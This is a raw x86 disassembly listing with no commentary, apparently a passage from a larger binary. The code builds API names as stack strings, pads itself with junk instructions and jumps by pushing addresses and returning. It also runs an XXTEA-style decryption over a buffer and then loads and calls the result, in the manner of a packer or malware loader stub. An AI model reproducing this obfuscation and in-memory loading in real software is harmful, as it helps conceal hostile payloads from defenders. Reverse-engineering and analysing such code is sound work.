  402343:	ff 15 00 f0 40 00    	call   *0x40f000
  402349:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40234c:	90                   	nop
  40234d:	90                   	nop
  40234e:	90                   	nop
  40234f:	40                   	inc    %eax
  402350:	4b                   	dec    %ebx
  402351:	48                   	dec    %eax
  402352:	43                   	inc    %ebx
  402353:	c6 45 c4 4b          	movb   $0x4b,-0x3c(%ebp)
  402357:	c6 45 c5 45          	movb   $0x45,-0x3b(%ebp)
  40235b:	c6 45 c6 52          	movb   $0x52,-0x3a(%ebp)
  40235f:	c6 45 c7 4e          	movb   $0x4e,-0x39(%ebp)
  402363:	c6 45 c8 45          	movb   $0x45,-0x38(%ebp)
  402367:	c6 45 c9 4c          	movb   $0x4c,-0x37(%ebp)
  40236b:	c6 45 ca 33          	movb   $0x33,-0x36(%ebp)
  40236f:	c6 45 cb 32          	movb   $0x32,-0x35(%ebp)
  402373:	c6 45 cc 2e          	movb   $0x2e,-0x34(%ebp)
  402377:	c6 45 cd 64          	movb   $0x64,-0x33(%ebp)
  40237b:	c6 45 ce 6c          	movb   $0x6c,-0x32(%ebp)
  40237f:	c6 45 cf 6c          	movb   $0x6c,-0x31(%ebp)
  402383:	c6 45 d0 00          	movb   $0x0,-0x30(%ebp)
  402387:	c6 45 e4 56          	movb   $0x56,-0x1c(%ebp)
  40238b:	c6 45 e5 69          	movb   $0x69,-0x1b(%ebp)
  40238f:	c6 45 e6 72          	movb   $0x72,-0x1a(%ebp)
  402393:	c6 45 e7 74          	movb   $0x74,-0x19(%ebp)
  402397:	c6 45 e8 75          	movb   $0x75,-0x18(%ebp)
  40239b:	c6 45 e9 61          	movb   $0x61,-0x17(%ebp)
  40239f:	c6 45 ea 6c          	movb   $0x6c,-0x16(%ebp)
  4023a3:	c6 45 eb 46          	movb   $0x46,-0x15(%ebp)
  4023a7:	c6 45 ec 72          	movb   $0x72,-0x14(%ebp)
  4023ab:	c6 45 ed 65          	movb   $0x65,-0x13(%ebp)
  4023af:	c6 45 ee 65          	movb   $0x65,-0x12(%ebp)
  4023b3:	c6 45 ef 00          	movb   $0x0,-0x11(%ebp)
  4023b7:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4023ba:	50                   	push   %eax
  4023bb:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4023be:	51                   	push   %ecx
  4023bf:	ff 15 04 f0 40 00    	call   *0x40f004
  4023c5:	50                   	push   %eax
  4023c6:	ff 15 00 f0 40 00    	call   *0x40f000
  4023cc:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4023cf:	68 00 af 45 00       	push   $0x45af00
  4023d4:	68 10 af 45 00       	push   $0x45af10
  4023d9:	ff 15 04 f0 40 00    	call   *0x40f004
  4023df:	50                   	push   %eax
  4023e0:	ff 15 00 f0 40 00    	call   *0x40f000
  4023e6:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4023e9:	90                   	nop
  4023ea:	90                   	nop
  4023eb:	90                   	nop
  4023ec:	90                   	nop
  4023ed:	90                   	nop
  4023ee:	90                   	nop
  4023ef:	8b 55 08             	mov    0x8(%ebp),%edx
  4023f2:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4023f5:	90                   	nop
  4023f6:	90                   	nop
  4023f7:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4023fe:	b8 01 00 00 00       	mov    $0x1,%eax
  402403:	85 c0                	test   %eax,%eax
  402405:	74 15                	je     0x40241c
  402407:	c7 45 b8 44 00 00 00 	movl   $0x44,-0x48(%ebp)
  40240e:	68 70 00 41 00       	push   $0x410070
  402413:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  402416:	51                   	push   %ecx
  402417:	e8 54 0a 00 00       	call   0x402e70
  40241c:	e9 d7 00 00 00       	jmp    0x4024f8
  402421:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  402425:	0f 84 c7 00 00 00    	je     0x4024f2
  40242b:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40242e:	83 7a 10 00          	cmpl   $0x0,0x10(%edx)
  402432:	74 2d                	je     0x402461
  402434:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402437:	8b 08                	mov    (%eax),%ecx
  402439:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40243c:	8b 42 04             	mov    0x4(%edx),%eax
  40243f:	03 41 28             	add    0x28(%ecx),%eax
  402442:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402445:	40                   	inc    %eax
  402446:	4b                   	dec    %ebx
  402447:	48                   	dec    %eax
  402448:	43                   	inc    %ebx
  402449:	6a 00                	push   $0x0
  40244b:	6a 00                	push   $0x0
  40244d:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402450:	8b 51 04             	mov    0x4(%ecx),%edx
  402453:	52                   	push   %edx
  402454:	ff 55 bc             	call   *-0x44(%ebp)
  402457:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40245a:	c7 40 10 00 00 00 00 	movl   $0x0,0x10(%eax)
  402461:	90                   	nop
  402462:	90                   	nop
  402463:	90                   	nop
  402464:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402467:	83 79 08 00          	cmpl   $0x0,0x8(%ecx)
  40246b:	74 54                	je     0x4024c1
  40246d:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  402474:	eb 09                	jmp    0x40247f
  402476:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  402479:	83 c2 01             	add    $0x1,%edx
  40247c:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  40247f:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402482:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402485:	3b 48 0c             	cmp    0xc(%eax),%ecx
  402488:	7d 24                	jge    0x4024ae
  40248a:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40248d:	8b 42 08             	mov    0x8(%edx),%eax
  402490:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402493:	83 3c 88 ff          	cmpl   $0xffffffff,(%eax,%ecx,4)
  402497:	74 13                	je     0x4024ac
  402499:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40249c:	8b 42 08             	mov    0x8(%edx),%eax
  40249f:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4024a2:	8b 14 88             	mov    (%eax,%ecx,4),%edx
  4024a5:	52                   	push   %edx
  4024a6:	ff 15 10 f0 40 00    	call   *0x40f010
  4024ac:	eb c8                	jmp    0x402476
  4024ae:	40                   	inc    %eax
  4024af:	4b                   	dec    %ebx
  4024b0:	48                   	dec    %eax
  4024b1:	43                   	inc    %ebx
  4024b2:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4024b5:	8b 48 08             	mov    0x8(%eax),%ecx
  4024b8:	51                   	push   %ecx
  4024b9:	e8 7a ec ff ff       	call   0x401138
  4024be:	83 c4 04             	add    $0x4,%esp
  4024c1:	40                   	inc    %eax
  4024c2:	4b                   	dec    %ebx
  4024c3:	48                   	dec    %eax
  4024c4:	43                   	inc    %ebx
  4024c5:	8b 55 d8             	mov    -0x28(%ebp),%edx
  4024c8:	83 7a 04 00          	cmpl   $0x0,0x4(%edx)
  4024cc:	74 11                	je     0x4024df
  4024ce:	68 00 80 00 00       	push   $0x8000
  4024d3:	6a 00                	push   $0x0
  4024d5:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4024d8:	8b 48 04             	mov    0x4(%eax),%ecx
  4024db:	51                   	push   %ecx
  4024dc:	ff 55 e0             	call   *-0x20(%ebp)
  4024df:	90                   	nop
  4024e0:	90                   	nop
  4024e1:	90                   	nop
  4024e2:	90                   	nop
  4024e3:	90                   	nop
  4024e4:	90                   	nop
  4024e5:	8b 55 d8             	mov    -0x28(%ebp),%edx
  4024e8:	52                   	push   %edx
  4024e9:	6a 00                	push   $0x0
  4024eb:	ff 55 dc             	call   *-0x24(%ebp)
  4024ee:	50                   	push   %eax
  4024ef:	ff 55 c0             	call   *-0x40(%ebp)
  4024f2:	b8 f8 24 40 00       	mov    $0x4024f8,%eax
  4024f7:	c3                   	ret
  4024f8:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4024ff:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402502:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402509:	5f                   	pop    %edi
  40250a:	5e                   	pop    %esi
  40250b:	5b                   	pop    %ebx
  40250c:	8b e5                	mov    %ebp,%esp
  40250e:	5d                   	pop    %ebp
  40250f:	c3                   	ret
  402510:	55                   	push   %ebp
  402511:	8b ec                	mov    %esp,%ebp
  402513:	6a ff                	push   $0xffffffff
  402515:	68 e4 eb 40 00       	push   $0x40ebe4
  40251a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402520:	50                   	push   %eax
  402521:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402528:	51                   	push   %ecx
  402529:	83 ec 10             	sub    $0x10,%esp
  40252c:	53                   	push   %ebx
  40252d:	56                   	push   %esi
  40252e:	57                   	push   %edi
  40252f:	89 65 f0             	mov    %esp,-0x10(%ebp)
  402532:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  402539:	b8 01 00 00 00       	mov    $0x1,%eax
  40253e:	85 c0                	test   %eax,%eax
  402540:	74 15                	je     0x402557
  402542:	c7 45 e4 30 00 00 00 	movl   $0x30,-0x1c(%ebp)
  402549:	68 70 00 41 00       	push   $0x410070
  40254e:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  402551:	51                   	push   %ecx
  402552:	e8 19 09 00 00       	call   0x402e70
  402557:	e9 8f 00 00 00       	jmp    0x4025eb
  40255c:	89 65 f0             	mov    %esp,-0x10(%ebp)
  40255f:	8b 45 10             	mov    0x10(%ebp),%eax
  402562:	25 ff 00 00 00       	and    $0xff,%eax
  402567:	99                   	cltd
  402568:	b9 5f 00 00 00       	mov    $0x5f,%ecx
  40256d:	f7 f9                	idiv   %ecx
  40256f:	83 c2 58             	add    $0x58,%edx
  402572:	88 55 ec             	mov    %dl,-0x14(%ebp)
  402575:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  40257c:	eb 09                	jmp    0x402587
  40257e:	8b 55 e8             	mov    -0x18(%ebp),%edx
  402581:	83 c2 01             	add    $0x1,%edx
  402584:	89 55 e8             	mov    %edx,-0x18(%ebp)
  402587:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40258a:	3b 45 0c             	cmp    0xc(%ebp),%eax
  40258d:	73 56                	jae    0x4025e5
  40258f:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  402593:	b9 01 00 00 00       	mov    $0x1,%ecx
  402598:	85 c9                	test   %ecx,%ecx
  40259a:	74 15                	je     0x4025b1
  40259c:	c7 45 e0 52 00 00 00 	movl   $0x52,-0x20(%ebp)
  4025a3:	68 70 00 41 00       	push   $0x410070
  4025a8:	8d 55 e0             	lea    -0x20(%ebp),%edx
  4025ab:	52                   	push   %edx
  4025ac:	e8 bf 08 00 00       	call   0x402e70
  4025b1:	eb 29                	jmp    0x4025dc
  4025b3:	8b 45 08             	mov    0x8(%ebp),%eax
  4025b6:	8a 08                	mov    (%eax),%cl
  4025b8:	32 4d ec             	xor    -0x14(%ebp),%cl
  4025bb:	8b 55 08             	mov    0x8(%ebp),%edx
  4025be:	88 0a                	mov    %cl,(%edx)
  4025c0:	8b 45 08             	mov    0x8(%ebp),%eax
  4025c3:	8a 08                	mov    (%eax),%cl
  4025c5:	02 4d ec             	add    -0x14(%ebp),%cl
  4025c8:	8b 55 08             	mov    0x8(%ebp),%edx
  4025cb:	88 0a                	mov    %cl,(%edx)
  4025cd:	8b 45 08             	mov    0x8(%ebp),%eax
  4025d0:	83 c0 01             	add    $0x1,%eax
  4025d3:	89 45 08             	mov    %eax,0x8(%ebp)
  4025d6:	b8 dc 25 40 00       	mov    $0x4025dc,%eax
  4025db:	c3                   	ret
  4025dc:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4025e3:	eb 99                	jmp    0x40257e
  4025e5:	b8 eb 25 40 00       	mov    $0x4025eb,%eax
  4025ea:	c3                   	ret
  4025eb:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4025f2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4025f5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4025fc:	5f                   	pop    %edi
  4025fd:	5e                   	pop    %esi
  4025fe:	5b                   	pop    %ebx
  4025ff:	8b e5                	mov    %ebp,%esp
  402601:	5d                   	pop    %ebp
  402602:	c3                   	ret
  402603:	55                   	push   %ebp
  402604:	8b ec                	mov    %esp,%ebp
  402606:	83 ec 18             	sub    $0x18,%esp
  402609:	56                   	push   %esi
  40260a:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  40260e:	0f 8e 40 01 00 00    	jle    0x402754
  402614:	b8 34 00 00 00       	mov    $0x34,%eax
  402619:	99                   	cltd
  40261a:	f7 7d 0c             	idivl  0xc(%ebp)
  40261d:	83 c0 06             	add    $0x6,%eax
  402620:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402623:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40262a:	8b 45 08             	mov    0x8(%ebp),%eax
  40262d:	03 45 0c             	add    0xc(%ebp),%eax
  402630:	33 c9                	xor    %ecx,%ecx
  402632:	8a 48 ff             	mov    -0x1(%eax),%cl
  402635:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  402638:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40263b:	81 ea 47 86 c8 61    	sub    $0x61c88647,%edx
  402641:	89 55 f4             	mov    %edx,-0xc(%ebp)
  402644:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402647:	c1 e8 02             	shr    $0x2,%eax
  40264a:	83 e0 03             	and    $0x3,%eax
  40264d:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402650:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  402657:	eb 09                	jmp    0x402662
  402659:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40265c:	83 c1 01             	add    $0x1,%ecx
  40265f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  402662:	8b 55 0c             	mov    0xc(%ebp),%edx
  402665:	83 ea 01             	sub    $0x1,%edx
  402668:	39 55 f8             	cmp    %edx,-0x8(%ebp)
  40266b:	73 69                	jae    0x4026d6
  40266d:	8b 45 08             	mov    0x8(%ebp),%eax
  402670:	03 45 f8             	add    -0x8(%ebp),%eax
  402673:	33 c9                	xor    %ecx,%ecx
  402675:	8a 48 01             	mov    0x1(%eax),%cl
  402678:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40267b:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40267e:	c1 ea 05             	shr    $0x5,%edx
  402681:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402684:	c1 e0 02             	shl    $0x2,%eax
  402687:	33 d0                	xor    %eax,%edx
  402689:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40268c:	c1 e9 03             	shr    $0x3,%ecx
  40268f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402692:	c1 e0 04             	shl    $0x4,%eax
  402695:	33 c8                	xor    %eax,%ecx
  402697:	03 d1                	add    %ecx,%edx
  402699:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40269c:	33 4d ec             	xor    -0x14(%ebp),%ecx
  40269f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4026a2:	83 e0 03             	and    $0x3,%eax
  4026a5:	33 45 f0             	xor    -0x10(%ebp),%eax
  4026a8:	8b 75 10             	mov    0x10(%ebp),%esi
  4026ab:	8b 04 86             	mov    (%esi,%eax,4),%eax
  4026ae:	33 45 e8             	xor    -0x18(%ebp),%eax
  4026b1:	03 c8                	add    %eax,%ecx
  4026b3:	33 d1                	xor    %ecx,%edx
  4026b5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4026b8:	03 4d f8             	add    -0x8(%ebp),%ecx
  4026bb:	8a 01                	mov    (%ecx),%al
  4026bd:	02 c2                	add    %dl,%al
  4026bf:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4026c2:	03 4d f8             	add    -0x8(%ebp),%ecx
  4026c5:	88 01                	mov    %al,(%ecx)
  4026c7:	8b 55 08             	mov    0x8(%ebp),%edx
  4026ca:	03 55 f8             	add    -0x8(%ebp),%edx
  4026cd:	33 c0                	xor    %eax,%eax
  4026cf:	8a 02                	mov    (%edx),%al
  4026d1:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4026d4:	eb 83                	jmp    0x402659
  4026d6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4026d9:	33 d2                	xor    %edx,%edx
  4026db:	8a 11                	mov    (%ecx),%dl
  4026dd:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4026e0:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4026e3:	c1 e8 05             	shr    $0x5,%eax
  4026e6:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4026e9:	c1 e1 02             	shl    $0x2,%ecx
  4026ec:	33 c1                	xor    %ecx,%eax
  4026ee:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4026f1:	c1 ea 03             	shr    $0x3,%edx
  4026f4:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4026f7:	c1 e1 04             	shl    $0x4,%ecx
  4026fa:	33 d1                	xor    %ecx,%edx
  4026fc:	03 c2                	add    %edx,%eax
  4026fe:	8b 55 f4             	mov    -0xc(%ebp),%edx
  402701:	33 55 ec             	xor    -0x14(%ebp),%edx
  402704:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402707:	83 e1 03             	and    $0x3,%ecx
  40270a:	33 4d f0             	xor    -0x10(%ebp),%ecx
  40270d:	8b 75 10             	mov    0x10(%ebp),%esi
  402710:	8b 0c 8e             	mov    (%esi,%ecx,4),%ecx
  402713:	33 4d e8             	xor    -0x18(%ebp),%ecx
  402716:	03 d1                	add    %ecx,%edx
  402718:	33 c2                	xor    %edx,%eax
  40271a:	8b 55 08             	mov    0x8(%ebp),%edx
  40271d:	03 55 0c             	add    0xc(%ebp),%edx
  402720:	8a 4a ff             	mov    -0x1(%edx),%cl
  402723:	02 c8                	add    %al,%cl
  402725:	8b 55 08             	mov    0x8(%ebp),%edx
  402728:	03 55 0c             	add    0xc(%ebp),%edx
  40272b:	88 4a ff             	mov    %cl,-0x1(%edx)
  40272e:	8b 45 08             	mov    0x8(%ebp),%eax
  402731:	03 45 0c             	add    0xc(%ebp),%eax
  402734:	33 c9                	xor    %ecx,%ecx
  402736:	8a 48 ff             	mov    -0x1(%eax),%cl
  402739:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  40273c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40273f:	83 ea 01             	sub    $0x1,%edx
  402742:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402745:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  402749:	0f 85 e9 fe ff ff    	jne    0x402638
  40274f:	e9 42 01 00 00       	jmp    0x402896
  402754:	83 7d 0c ff          	cmpl   $0xffffffff,0xc(%ebp)
  402758:	0f 8d 38 01 00 00    	jge    0x402896
  40275e:	8b 45 0c             	mov    0xc(%ebp),%eax
  402761:	f7 d8                	neg    %eax
  402763:	89 45 0c             	mov    %eax,0xc(%ebp)
  402766:	b8 34 00 00 00       	mov    $0x34,%eax
  40276b:	99                   	cltd
  40276c:	f7 7d 0c             	idivl  0xc(%ebp)
  40276f:	83 c0 06             	add    $0x6,%eax
  402772:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402775:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402778:	69 c9 b9 79 37 9e    	imul   $0x9e3779b9,%ecx,%ecx
  40277e:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402781:	8b 55 08             	mov    0x8(%ebp),%edx
  402784:	33 c0                	xor    %eax,%eax
  402786:	8a 02                	mov    (%edx),%al
  402788:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40278b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40278e:	c1 e9 02             	shr    $0x2,%ecx
  402791:	83 e1 03             	and    $0x3,%ecx
  402794:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402797:	8b 55 0c             	mov    0xc(%ebp),%edx
  40279a:	83 ea 01             	sub    $0x1,%edx
  40279d:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4027a0:	eb 09                	jmp    0x4027ab
  4027a2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4027a5:	83 e8 01             	sub    $0x1,%eax
  4027a8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4027ab:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4027af:	76 69                	jbe    0x40281a
  4027b1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4027b4:	03 4d f8             	add    -0x8(%ebp),%ecx
  4027b7:	33 d2                	xor    %edx,%edx
  4027b9:	8a 51 ff             	mov    -0x1(%ecx),%dl
  4027bc:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4027bf:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4027c2:	c1 e8 05             	shr    $0x5,%eax
  4027c5:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4027c8:	c1 e1 02             	shl    $0x2,%ecx
  4027cb:	33 c1                	xor    %ecx,%eax
  4027cd:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4027d0:	c1 ea 03             	shr    $0x3,%edx
  4027d3:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4027d6:	c1 e1 04             	shl    $0x4,%ecx
  4027d9:	33 d1                	xor    %ecx,%edx
  4027db:	03 c2                	add    %edx,%eax
  4027dd:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4027e0:	33 55 ec             	xor    -0x14(%ebp),%edx
  4027e3:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4027e6:	83 e1 03             	and    $0x3,%ecx
  4027e9:	33 4d f0             	xor    -0x10(%ebp),%ecx
  4027ec:	8b 75 10             	mov    0x10(%ebp),%esi
  4027ef:	8b 0c 8e             	mov    (%esi,%ecx,4),%ecx
  4027f2:	33 4d e8             	xor    -0x18(%ebp),%ecx
  4027f5:	03 d1                	add    %ecx,%edx
  4027f7:	33 c2                	xor    %edx,%eax
  4027f9:	8b 55 08             	mov    0x8(%ebp),%edx
  4027fc:	03 55 f8             	add    -0x8(%ebp),%edx
  4027ff:	8a 0a                	mov    (%edx),%cl
  402801:	2a c8                	sub    %al,%cl
  402803:	8b 55 08             	mov    0x8(%ebp),%edx
  402806:	03 55 f8             	add    -0x8(%ebp),%edx
  402809:	88 0a                	mov    %cl,(%edx)
  40280b:	8b 45 08             	mov    0x8(%ebp),%eax
  40280e:	03 45 f8             	add    -0x8(%ebp),%eax
  402811:	33 c9                	xor    %ecx,%ecx
  402813:	8a 08                	mov    (%eax),%cl
  402815:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  402818:	eb 88                	jmp    0x4027a2
  40281a:	8b 55 08             	mov    0x8(%ebp),%edx
  40281d:	03 55 0c             	add    0xc(%ebp),%edx
  402820:	33 c0                	xor    %eax,%eax
  402822:	8a 42 ff             	mov    -0x1(%edx),%al
  402825:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402828:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40282b:	c1 e9 05             	shr    $0x5,%ecx
  40282e:	8b 55 ec             	mov    -0x14(%ebp),%edx
  402831:	c1 e2 02             	shl    $0x2,%edx
  402834:	33 ca                	xor    %edx,%ecx
  402836:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402839:	c1 e8 03             	shr    $0x3,%eax
  40283c:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40283f:	c1 e2 04             	shl    $0x4,%edx
  402842:	33 c2                	xor    %edx,%eax
  402844:	03 c8                	add    %eax,%ecx
  402846:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402849:	33 45 ec             	xor    -0x14(%ebp),%eax
  40284c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40284f:	83 e2 03             	and    $0x3,%edx
  402852:	33 55 f0             	xor    -0x10(%ebp),%edx
  402855:	8b 75 10             	mov    0x10(%ebp),%esi
  402858:	8b 14 96             	mov    (%esi,%edx,4),%edx
  40285b:	33 55 e8             	xor    -0x18(%ebp),%edx
  40285e:	03 c2                	add    %edx,%eax
  402860:	33 c8                	xor    %eax,%ecx
  402862:	8b 45 08             	mov    0x8(%ebp),%eax
  402865:	8a 10                	mov    (%eax),%dl
  402867:	2a d1                	sub    %cl,%dl
  402869:	8b 45 08             	mov    0x8(%ebp),%eax
  40286c:	88 10                	mov    %dl,(%eax)
  40286e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402871:	33 d2                	xor    %edx,%edx
  402873:	8a 11                	mov    (%ecx),%dl
  402875:	89 55 ec             	mov    %edx,-0x14(%ebp)
  402878:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40287b:	05 47 86 c8 61       	add    $0x61c88647,%eax
  402880:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402883:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402886:	83 e9 01             	sub    $0x1,%ecx
  402889:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40288c:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  402890:	0f 85 f5 fe ff ff    	jne    0x40278b
  402896:	5e                   	pop    %esi
  402897:	8b e5                	mov    %ebp,%esp
  402899:	5d                   	pop    %ebp
  40289a:	c3                   	ret
  40289b:	55                   	push   %ebp
  40289c:	8b ec                	mov    %esp,%ebp
  40289e:	83 ec 18             	sub    $0x18,%esp
  4028a1:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  4028a8:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  4028af:	c7 45 f0 08 00 00 00 	movl   $0x8,-0x10(%ebp)
  4028b6:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4028bd:	a1 58 10 41 00       	mov    0x411058,%eax
  4028c2:	50                   	push   %eax
  4028c3:	8b 0d 54 10 41 00    	mov    0x411054,%ecx
  4028c9:	51                   	push   %ecx
  4028ca:	68 5c 10 41 00       	push   $0x41105c
  4028cf:	e8 3c fc ff ff       	call   0x402510
  4028d4:	83 c4 0c             	add    $0xc,%esp
  4028d7:	8d 55 e8             	lea    -0x18(%ebp),%edx
  4028da:	52                   	push   %edx
  4028db:	a1 54 10 41 00       	mov    0x411054,%eax
  4028e0:	f7 d8                	neg    %eax
  4028e2:	50                   	push   %eax
  4028e3:	68 5c 10 41 00       	push   $0x41105c
  4028e8:	e8 16 fd ff ff       	call   0x402603
  4028ed:	83 c4 0c             	add    $0xc,%esp
  4028f0:	68 5c 10 41 00       	push   $0x41105c
  4028f5:	e8 4d eb ff ff       	call   0x401447
  4028fa:	83 c4 04             	add    $0x4,%esp
  4028fd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402900:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  402904:	75 02                	jne    0x402908
  402906:	eb 43                	jmp    0x40294b
  402908:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40290b:	51                   	push   %ecx
  40290c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40290f:	52                   	push   %edx
  402910:	e8 5a f8 ff ff       	call   0x40216f
  402915:	83 c4 08             	add    $0x8,%esp
  402918:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40291b:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40291f:	75 0e                	jne    0x40292f
  402921:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402924:	50                   	push   %eax
  402925:	e8 e6 f9 ff ff       	call   0x402310
  40292a:	83 c4 04             	add    $0x4,%esp
  40292d:	eb 1c                	jmp    0x40294b
  40292f:	ff 55 fc             	call   *-0x4(%ebp)
  402932:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  402936:	74 13                	je     0x40294b
  402938:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40293b:	51                   	push   %ecx
  40293c:	e8 cf f9 ff ff       	call   0x402310
  402941:	83 c4 04             	add    $0x4,%esp
  402944:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  40294b:	8b e5                	mov    %ebp,%esp
  40294d:	5d                   	pop    %ebp
  40294e:	c3                   	ret
  40294f:	55                   	push   %ebp
  402950:	8b ec                	mov    %esp,%ebp
  402952:	68 bc ad 45 00       	push   $0x45adbc
  402957:	e8 3f ff ff ff       	call   0x40289b
  40295c:	83 c4 04             	add    $0x4,%esp
  40295f:	33 c0                	xor    %eax,%eax
  402961:	5d                   	pop    %ebp
  402962:	c2 10 00             	ret    $0x10
  402965:	cc                   	int3
  402966:	cc                   	int3
  402967:	cc                   	int3
  402968:	cc                   	int3
  402969:	cc                   	int3
  40296a:	cc                   	int3
  40296b:	cc                   	int3
  40296c:	cc                   	int3
  40296d:	cc                   	int3
  40296e:	cc                   	int3
  40296f:	cc                   	int3
  402970:	55                   	push   %ebp
  402971:	8b ec                	mov    %esp,%ebp
  402973:	51                   	push   %ecx
  402974:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  402977:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40297a:	c7 00 04 f1 40 00    	movl   $0x40f104,(%eax)
  402980:	6a 1b                	push   $0x1b
  402982:	e8 e9 0a 00 00       	call   0x403470
  402987:	83 c4 04             	add    $0x4,%esp
  40298a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
